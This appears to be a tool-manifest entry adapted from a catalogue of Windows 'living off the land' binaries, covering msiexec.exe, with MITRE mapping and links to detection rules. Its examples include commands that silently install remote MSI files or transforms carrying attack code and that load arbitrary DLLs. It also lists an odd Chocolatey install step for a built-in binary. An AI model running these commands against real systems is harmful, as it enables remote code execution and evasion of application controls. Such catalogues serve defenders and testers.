---
id: windows-execution-msiexec
namespace: windows:execution:msiexec
name: msiexec
description: 'Used by Windows to execute msi files Located at: C:\Windows\System32\msiexec.exe; C:\Windows\SysWOW64\msiexec.exe.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- security.execution.command
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: low
  disk_io: low
allowed-tools:
- msiexec
parameters: []
features: []
execution:
  template: msiexec
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Installs the target .MSI file silently. (Execute custom made msi file with attack code)
  command: msiexec /quiet /i {PATH:.msi}
- description: Installs the target remote & renamed .MSI file silently. (Execute custom made msi file with attack code from remote server)
  command: msiexec /q /i {REMOTEURL}
- description: Calls DllRegisterServer to register the target DLL. (Execute dll files)
  command: msiexec /y {PATH_ABSOLUTE:.dll}
- description: Calls DllUnregisterServer to un-register the target DLL. (Execute dll files)
  command: msiexec /z {PATH_ABSOLUTE:.dll}
- description: Installs the target .MSI file from a remote URL, the file can be signed by vendor. Additional to the file a transformation file will be used, which can contains malicious code or binaries. The /qb will skip user input. (Install trusted and signed msi file, with additional attack code as transformation file, from a remote server)
  command: msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS="{REMOTEURL:.mst}" /qb
references:
- label: ''
  url: https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/
- label: '992021361106268161'
  url: https://twitter.com/PhilipTsukerman/status/992021361106268161
- label: MSIFortune.html
  url: https://badoption.eu/blog/2023/10/03/MSIFortune.html
techniques:
- execution
- defense-evasion
mitre_ids:
- T1218.007
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msiexec_web_install.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msiexec_masquerading.yml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
- type: splunk
  url: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/uninstall_app_using_msiexec.yml
- type: ioc
  description: msiexec.exe retrieving files from Internet
install:
- method: choco
  package_name: msiexec
  commands:
  - choco install msiexec
---


# msiexec

msiexec is a Windows LOLBin. Used by Windows to execute msi files Located at: C:\Windows\System32\msiexec.exe; C:\Windows\SysWOW64\msiexec.exe.
